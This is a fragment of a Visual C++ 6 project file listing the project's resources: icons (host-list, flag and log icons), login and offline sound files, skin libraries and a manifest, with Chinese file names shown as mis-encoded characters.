# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\Ӳ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\�û�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\Լ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\Խ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\����ʱ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\�ޱ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\է��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\�з�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\�й�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\�ظ�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\�³.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\��ٸ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\쳼�.ico"
# End Source File
# Begin Source File

SOURCE=.\USkin.lib
# End Source File
# End Group
# Begin Source File

SOURCE=.\res\Wave\login.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\offline.wav
# End Source File
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\res\Wave\Setting.wav
# End Source File
# Begin Source File

SOURCE=..\Bin\SkinH.dll
# End Source File
# Begin Source File

SOURCE=..\Bin\Skins\SkinH.she
# End Source File
# Begin Source File

SOURCE=.\res\xpstyle.manifest
# End Source File
# End Target
# End Project
